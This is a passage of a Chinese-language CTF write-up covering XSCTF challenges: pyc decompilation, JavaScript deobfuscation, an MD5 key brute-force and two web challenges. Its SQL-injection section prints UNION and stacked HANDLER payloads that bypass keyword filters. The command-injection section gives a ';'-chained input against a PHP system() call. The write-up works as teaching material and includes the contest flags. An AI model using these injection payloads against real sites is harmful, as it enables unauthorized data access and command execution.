class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            num = <span class="string">f&quot;<span class="subst">&#123;i*<span class="number">100</span>+j*<span class="number">10</span>+k:<span class="number">03</span>d&#125;</span>&quot;</span></span><br><span class="line">            c = hashlib.md5(num.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">            print(num, <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(num) == <span class="built_in">str</span>(c)[<span class="number">0</span>:<span class="number">3</span>]:</span><br><span class="line">                print(num)</span><br></pre></td></tr></table></figure><p>这里有个坑，使用python实现md5编码还有一种先update再hexdigest的方法，那种方法在这里是行不通的<br><code>320</code><br>然后将key作为输入就可以得到解密后的图片了</p><p><code>flag&#123;pic_pic_is_so_easy!&#125;</code></p><h2 id="Ro1ling"><a href="#Ro1ling" class="headerlink" title="Ro1ling~"></a>Ro1ling~</h2><p>题目描述</p><ol><li>flag is rolling ~ flag is flying ~</li><li>press <code>q</code> to quit</li><li>tips: The flag format is <code>XSCTF\&#123;[ -~]+\&#125;</code></li></ol><p>运行程序，会出现弹幕一样飘过的文字<br>但是，在中止运行时出现了这样的报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">97</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;curses\__init__.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> wrapper</span><br><span class="line">  File <span class="string">&quot;Ro1ling.py&quot;</span>, line <span class="number">94</span>, <span class="keyword">in</span> main</span><br><span class="line">KeyboardInterrupt</span><br><span class="line">[<span class="number">21964</span>] Failed to execute script <span class="string">&#x27;Ro1ling&#x27;</span> due to unhandled exception!</span><br></pre></td></tr></table></figure><p>熟悉的Traceback，一眼就能看出来是python</p><p>所以这是一个使用python编写并打包的exe文件<br>能打包python的工具主要有<code>pyinstaller</code>等，这里使用对应的<code>pyinstxtractor</code>反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Ro1ling.exe</span><br></pre></td></tr></table></figure><p>运行以上命令之后就会在当前目录下生成一个文件夹，其中有同名的pyc文件<br>使用<code>uncompyle6</code>将pyc文件转换为py文件<br>但是报错了<br>使用在线网站的结果也是不完整的</p><p>上网查询之后找到这么一篇博客<br><a href="https://www.cnblogs.com/czlnb/p/16246759.html">python逆向实战：反编译python3 pyc文件 - 乘舟凉 - 博客园 (cnblogs.com)</a></p><p>里边有手动提取opcode的示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> uncompyle6.main <span class="keyword">import</span> decompile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># version = (3, 8, 0)</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sub_codeObject_list</span>(<span class="params">co</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [ins <span class="keyword">for</span> ins <span class="keyword">in</span> <span class="built_in">list</span>(dis.Bytecode(co)) <span class="keyword">if</span> <span class="string">&quot;code object&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(ins.argval)]</span><br><span class="line"></span><br><span class="line">outstream = sys.stdout</span><br><span class="line">showasm = <span class="literal">None</span></span><br><span class="line">showast = <span class="literal">False</span></span><br><span class="line">showgrammar = <span class="literal">False</span></span><br><span class="line">source_encoding = <span class="literal">None</span></span><br><span class="line">mapstream = <span class="literal">None</span></span><br><span class="line">do_fragments = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xdis <span class="keyword">import</span> load_module</span><br><span class="line">filename = <span class="string">&quot;Ro1ling.pyc&quot;</span></span><br><span class="line">code_objects = &#123;&#125;</span><br><span class="line">(version, timestamp, magic_int, co, is_pypy, source_size, sip_hash) = load_module(</span><br><span class="line">    filename, code_objects</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompile_part</span>(<span class="params">co,father_name=<span class="literal">None</span>,outstream=sys.stdout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> father_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            name = <span class="string">&quot;%s.%s&quot;</span> % (father_name,co.co_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = co.co_name</span><br><span class="line">        outstream.write(<span class="string">&quot;\n# %s ____________________________________________\n&quot;</span> % name)</span><br><span class="line">        decompile(</span><br><span class="line">            version,</span><br><span class="line">            co,</span><br><span class="line">            outstream,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            timestamp,</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="literal">None</span>,</span><br><span class="line">            code_objects=&#123;&#125;,</span><br><span class="line">            source_size=source_size,</span><br><span class="line">            is_pypy=<span class="literal">False</span>,</span><br><span class="line">            magic_int=magic_int,</span><br><span class="line">            mapstream=<span class="literal">None</span>,</span><br><span class="line">            do_fragments=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        bytecode = get_sub_codeObject_list(co)</span><br><span class="line">        <span class="keyword">for</span> code <span class="keyword">in</span> bytecode:</span><br><span class="line">            co = code.argval</span><br><span class="line">            decompile_part(co,name,outstream)</span><br><span class="line">decompile_part(co)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="comment">#改变标准输出的默认编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        byteCode = fp.read()[<span class="number">16</span>:]</span><br><span class="line">   </span><br><span class="line">    co  = marshal.loads(byteCode)</span><br><span class="line">    dis.dis(co)</span><br></pre></td></tr></table></figure><p>先运行第一份代码，再运行第二份代码，就可以得到opcode的输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> 28          72 BUILD_LIST               0</span><br><span class="line">             74 LOAD_CONST               6 ((<span class="string">&#x27;Summer in the hills&#x27;</span>, <span class="string">&#x27;Those hazy days I do remember&#x27;</span>, <span class="string">&#x27;We were running still&#x27;</span>, <span class="string">&#x27;Had the whole world at our feet&#x27;</span>, <span class="string">&#x27;Watching seasons change&#x27;</span>, <span class="string">&#x27;Our roads were lined with adventure&#x27;</span>, <span class="string">&#x27;Mountains in the way&#x27;</span>, <span class="string">&quot;Couldn&#x27;t keep us from the sea&quot;</span>, <span class="string">&#x27;Here we stand open arms&#x27;</span>, <span class="string">&#x27;This is home where we are&#x27;</span>, <span class="string">&#x27;Ever strong in the world that we made&#x27;</span>, <span class="string">&#x27;I still hear you in the breeze&#x27;</span>, <span class="string">&#x27;See your shadows in the trees&#x27;</span>, <span class="string">&#x27;Holding on, memories never change&#x27;</span>))</span><br><span class="line">             76 CALL_FINALLY             1 (to 79)</span><br><span class="line">             78 STORE_DEREF              2 (phrases)</span><br><span class="line"></span><br><span class="line"> 29          80 LOAD_CONST               7 (<span class="string">&#x27;𝙓𝙎𝘾𝙏𝙁&#123;𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜                    𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_�</span></span><br><span class="line"><span class="string">44𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5&#125;&#x27;</span>)</span><br><span class="line">             82 STORE_DEREF              3 (secret_message)</span><br><span class="line"></span><br><span class="line"> 46          84 LOAD_DEREF               4 (stdscr)</span><br><span class="line">        &gt;&gt;   86 LOAD_METHOD              7 (nodelay)</span><br><span class="line">             88 LOAD_CONST               8 (True)</span><br><span class="line">             90 CALL_METHOD              1</span><br><span class="line">             92 POP_TOP</span><br></pre></td></tr></table></figure><p>其中因为命令行的编码原因这里的flag其实是乱码（因此我还分析了一下opcode有没有加密的过程，事实证明没有）<br>但是opcode转换为py代码的方式没有找到</p><p>在复制到其他文本编辑器之后就可以看到flag了（要手打，因为格式写了只支持ascii编码的字符，这里是unicode）</p><p><code>XSCTF&#123;F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5&#125;</code><br><del>这flag真长啊</del></p><h2 id="Running"><a href="#Running" class="headerlink" title="Running~"></a>Running~</h2><p>一个没有后缀的文件，内容是js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x21b6c9=_0xe50d;<span class="function"><span class="keyword">function</span> <span class="title">_0xe50d</span>(<span class="params">_0x483c4e,_0x3bb3e1</span>)</span>&#123;<span class="keyword">var</span> _0x1173b4=_0x1173();<span class="keyword">return</span> _0xe50d=<span class="function"><span class="keyword">function</span>(<span class="params">_0xe50d90,_0x1a4c11</span>)</span>&#123;_0xe50d90=_0xe50d90-<span class="number">0x105</span>;<span class="keyword">var</span> _0x33ff31=_0x1173b4[_0xe50d90];<span class="keyword">return</span> _0x33ff31;&#125;,_0xe50d(_0x483c4e,_0x3bb3e1);&#125;<span class="function"><span class="keyword">function</span> <span class="title">_0x1173</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2badaa=[<span class="string">&#x27;920aGutvi&#x27;</span>,<span class="string">&#x27;517wlRFdu&#x27;</span>,<span class="string">&#x27;221112hjXCvb&#x27;</span>,<span class="string">&#x27;169436bqkkfr&#x27;</span>,<span class="string">&#x27;8dhAXCJ&#x27;</span>,<span class="string">&#x27;12838203EfwKcG&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;CgogX18gICBfXyAgIF9fX19fICAgIF9fX19fICAgX19fX19fXyAgIF9fX19fXyAgICAgX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgXyAgIF8gICAgIF8gICAgICAgICAgIF8gICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgIF8gIF8gICAgIF8gICAgIF8gICAgX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gICAgICAgICAgICAgX19fXyAgICBfICAgICAgICBfXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgXyAgICAgICAgICAgICAgICAgIF9fICAgCiBcIFwgLyAvICAvIF9fX198ICAvIF9fX198IHxfXyAgIF9ffCB8ICBfX19ffCAgIC8gLyAgICAgL1wgICAgICAgICAgICAgICAgICAgICAgfF8gICBffCAgICAgICAgIChfKSB8IHwgICAoXykgICAgICAgICB8IHwgICAgICAgICAgfCAgX19fX3wgICAgICAgICAgICAgICAgL18gfCAgICAgICAgICAgICAgICB8IHx8IHwgICB8IHwgICAoXykgIC8gXyBcICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gX3wgICAgICAgICAgIC8gX18gXCAgfCB8ICAgICAgLyBffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgfCAgIChfKSAgICAgICAgICAgICAgICAgXCBcICAKICBcIFYgLyAgfCAoX19fICAgfCB8ICAgICAgICAgfCB8ICAgIHwgfF9fICAgICB8IHwgICAgIC8gIFwgICAgIF8gX18gICAgICAgICAgICAgIHwgfCAgICBfIF9fICAgIF8gIHwgfF8gICBfICAgIF9fIF8gIHwgfCAgICAgICAgICB8IHxfXyAgICBfXyAgX18gIF8gX18gICAgfCB8ICAgX19fICAgIF8gX18gIHwgfHwgfF8gIHwgfF8gICBfICB8IHwgfCB8ICBfIF9fICAgICAgICAgICAgICBfX18gICB8IHxfICAgICAgICAgICB8IHwgIHwgfCB8IHxfXyAgIHwgfF8gICBfICAgXyAgIF9fXyAgICBfX18gICAgX18gXyAgfCB8XyAgIF8gICAgX19fICAgIF8gX18gICAgfCB8IAogICA+IDwgICAgXF9fXyBcICB8IHwgICAgICAgICB8IHwgICAgfCAgX198ICAgLyAvICAgICAvIC9cIFwgICB8ICdfIFwgICAgICAgICAgICAgfCB8ICAgfCAnXyBcICB8IHwgfCBfX3wgfCB8ICAvIF9gIHwgfCB8ICAgICAgICAgIHwgIF9ffCAgIFwgXC8gLyB8ICdfIFwgICB8IHwgIC8gXyBcICB8ICdfX3wgfF9fICAgX3wgfCBfX3wgfCB8IHwgfCB8IHwgfCAnXyBcICAgICAgICAgICAgLyBfIFwgIHwgIF98ICAgICAgICAgIHwgfCAgfCB8IHwgJ18gXCAgfCAgX3wgfCB8IHwgfCAvIF9ffCAgLyBfX3wgIC8gX2AgfCB8IF9ffCB8IHwgIC8gXyBcICB8ICdfIFwgICAgXCBcCiAgLyAuIFwgICBfX19fKSB8IHwgfF9fX18gICAgIHwgfCAgICB8IHwgICAgICBcIFwgICAgLyBfX19fIFwgIHwgfCB8IHwgICAgICAgICAgIF98IHxfICB8IHwgfCB8IHwgfCB8IHxfICB8IHwgfCAoX3wgfCB8IHwgICAgICAgICAgfCB8X19fXyAgID4gIDwgIHwgfF8pIHwgIHwgfCB8IChfKSB8IHwgfCAgICAgICB8IHwgICB8IHxfICB8IHwgfCB8X3wgfCB8IHwgfCB8ICAgICAgICAgIHwgKF8pIHwgfCB8ICAgICAgICAgICAgfCB8X198IHwgfCB8XykgfCB8IHwgICB8IHxffCB8IFxfXyBcIHwgKF9fICB8IChffCB8IHwgfF8gIHwgfCB8IChfKSB8IHwgfCB8IHwgICAvIC8KIC9fLyBcX1wgfF9fX19fLyAgIFxfX19fX3wgICAgfF98ICAgIHxffCAgICAgICB8IHwgIC9fLyAgICBcX1wgfF98IHxffCAgICAgICAgICB8X19fX198IHxffCB8X3wgfF98ICBcX198IHxffCAgXF9fLF98IHxffCAgICAgICAgICB8X19fX19ffCAvXy9cX1wgfCAuX18vICAgfF98ICBcX19fLyAgfF98ICAgICAgIHxffCAgICBcX198IHxffCAgXF9fXy8gIHxffCB8X3wgICAgICAgICAgIFxfX18vICB8X3wgICAgICAgICAgICAgXF9fX18vICB8Xy5fXy8gIHxffCAgICBcX18sX3wgfF9fXy8gIFxfX198ICBcX18sX3wgIFxfX3wgfF98ICBcX19fLyAgfF98IHxffCAgfCB8IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX1wgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICB8IHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX19fICAgICAgICAgICAgICAgICBfX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgIHxffCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgfF9fX19fX3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCg==&#x27;</span>,<span class="string">&#x27;3076824IERKkW&#x27;</span>,<span class="string">&#x27;6626otVnDv&#x27;</span>,<span class="string">&#x27;4488330eyQBas&#x27;</span>,<span class="string">&#x27;7196435AHLNnm&#x27;</span>];_0x1173=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> _0x2badaa;&#125;;<span class="keyword">return</span> _0x1173();&#125;(<span class="function"><span class="keyword">function</span>(<span class="params">_0x3fa77a,_0x506be4</span>)</span>&#123;<span class="keyword">var</span> _0x324ad3=_0xe50d,_0x1b9807=_0x3fa77a();<span class="function"><span class="title">while</span>(<span class="params">!![]</span>)</span>&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x5cf5b7=-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x107</span>))/<span class="number">0x1</span>*(-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10f</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10e</span>))/<span class="number">0x3</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x109</span>))/<span class="number">0x4</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x105</span>))/<span class="number">0x5</span>+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x110</span>))/<span class="number">0x6</span>+<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10b</span>))/<span class="number">0x7</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x10a</span>))/<span class="number">0x8</span>)+-<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x108</span>))/<span class="number">0x9</span>*(<span class="built_in">parseInt</span>(_0x324ad3(<span class="number">0x106</span>))/<span class="number">0xa</span>);<span class="keyword">if</span>(_0x5cf5b7===_0x506be4)<span class="keyword">break</span>;<span class="keyword">else</span> _0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x29c073</span>)</span>&#123;_0x1b9807[<span class="string">&#x27;push&#x27;</span>](_0x1b9807[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x1173,<span class="number">0xf2d11</span>),<span class="built_in">console</span>[_0x21b6c9(<span class="number">0x10c</span>)](atob(_0x21b6c9(<span class="number">0x10d</span>))));</span><br></pre></td></tr></table></figure><p>直接复制到浏览器控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__   __   _____    _____   _______   ______     __                              _____           _   _     _           _            ______                  __                  _  _     _     _    ___                              __             ____    _        __                                _     _                  __   </span><br><span class="line">\ \ &#x2F; &#x2F;  &#x2F; ____|  &#x2F; ____| |__   __| |  ____|   &#x2F; &#x2F;     &#x2F;\                      |_   _|         (_) | |   (_)         | |          |  ____|                &#x2F;_ |                | || |   | |   (_)  &#x2F; _ \                            &#x2F; _|           &#x2F; __ \  | |      &#x2F; _|                              | |   (_)                 \ \  </span><br><span class="line"> \ V &#x2F;  | (___   | |         | |    | |__     | |     &#x2F;  \     _ __              | |    _ __    _  | |_   _    __ _  | |          | |__    __  __  _ __    | |   ___    _ __  | || |_  | |_   _  | | | |  _ __              ___   | |_           | |  | | | |__   | |_   _   _   ___    ___    __ _  | |_   _    ___    _ __    | | </span><br><span class="line">  &gt; &lt;    \___ \  | |         | |    |  __|   &#x2F; &#x2F;     &#x2F; &#x2F;\ \   | &#39;_ \             | |   | &#39;_ \  | | | __| | |  &#x2F; _&#96; | | |          |  __|   \ \&#x2F; &#x2F; | &#39;_ \   | |  &#x2F; _ \  | &#39;__| |__   _| | __| | | | | | | | &#39;_ \            &#x2F; _ \  |  _|          | |  | | | &#39;_ \  |  _| | | | | &#x2F; __|  &#x2F; __|  &#x2F; _&#96; | | __| | |  &#x2F; _ \  | &#39;_ \    \ \</span><br><span class="line"> &#x2F; . \   ____) | | |____     | |    | |      \ \    &#x2F; ____ \  | | | |           _| |_  | | | | | | | |_  | | | (_| | | |          | |____   &gt;  &lt;  | |_) |  | | | (_) | | |       | |   | |_  | | | |_| | | | | |          | (_) | | |            | |__| | | |_) | | |   | |_| | \__ \ | (__  | (_| | | |_  | | | (_) | | | | |   &#x2F; &#x2F;</span><br><span class="line">&#x2F;_&#x2F; \_\ |_____&#x2F;   \_____|    |_|    |_|       | |  &#x2F;_&#x2F;    \_\ |_| |_|          |_____| |_| |_| |_|  \__| |_|  \__,_| |_|          |______| &#x2F;_&#x2F;\_\ | .__&#x2F;   |_|  \___&#x2F;  |_|       |_|    \__| |_|  \___&#x2F;  |_| |_|           \___&#x2F;  |_|             \____&#x2F;  |_.__&#x2F;  |_|    \__,_| |___&#x2F;  \___|  \__,_|  \__| |_|  \___&#x2F;  |_| |_|  | | </span><br><span class="line">                                               \_\                     ______                                             ______                  | |                                                             ______                 ______                                                                                &#x2F;_&#x2F;  </span><br><span class="line">                                                                      |______|                                           |______|                 |_|                                                            |______|               |______|                                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拉伸一下就可以看到flag（换成不会自动换行的文本编辑软件，如notepad++）</p><p><code>XSCTF&#123;An_Initial_Exp1or4ti0n_of_Obfuscation&#125;</code></p><h2 id="saveSaofe1a-partA"><a href="#saveSaofe1a-partA" class="headerlink" title="saveSaofe1a_partA"></a>saveSaofe1a_partA</h2><p>考sql注入<br>测试一下发现是字符型查询，并且存在联合注入</p><ul><li>首先查询当前数据库</li><li>然后查询该数据库下的表</li><li>然后查询表下的字段</li><li>根据题目提示，逐个翻表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=&#x27;</span>student<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;class1&#x27;</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>),<span class="keyword">group_concat</span>(<span class="keyword">name</span>),<span class="keyword">group_concat</span>(<span class="keyword">class</span>),<span class="keyword">group_concat</span>(hobbies) <span class="keyword">from</span> class2<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(id),group_concat(name),group_concat(class),group_concat(hobbies) from class3#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_r3a11y_l0ve_xiaomei&#125;</code></p><h2 id="saveSaofe1a-partB"><a href="#saveSaofe1a-partB" class="headerlink" title="saveSaofe1a_partB"></a>saveSaofe1a_partB</h2><p>同样是sql注入<br>经过测试：<br><code>让我想想除了insert、where、delete、select、drop、update和.你们大黑阔还有什么招</code><br><code>嘻嘻，想起来了，set、prepare、execute也不行哦</code></p><p>用handler可以查</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="keyword">handler</span> <span class="string">`2333`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果不在第一条，但是题目又过滤了where关键字，可以使用limit</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">open</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">read</span> <span class="keyword">first</span> <span class="keyword">limit</span> <span class="number">30</span>,<span class="number">1</span>;<span class="keyword">handler</span> <span class="string">`class3`</span> <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Saofe1a_wAnt_a_9ir1fri3nd&#125;</code></p><h2 id="燕子不要走"><a href="#燕子不要走" class="headerlink" title="燕子不要走~"></a>燕子不要走~</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//燕子，燕子，没有你我怎么活啊，不要甩开我啊  </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params">$cmd</span>)</span>&#123;    system($cmd.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) ? hello_shell($_GET[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用分号隔开即可<br><code>?cmd=cat /flag;</code></p><p><code>XSCTF&#123;Yanz1_i_w1sh_y0u_hApp1neSs&#125;</code></p><h2 id="gift-RSA"><a href="#gift-RSA" class="headerlink" title="gift_RSA"></a>gift_RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span 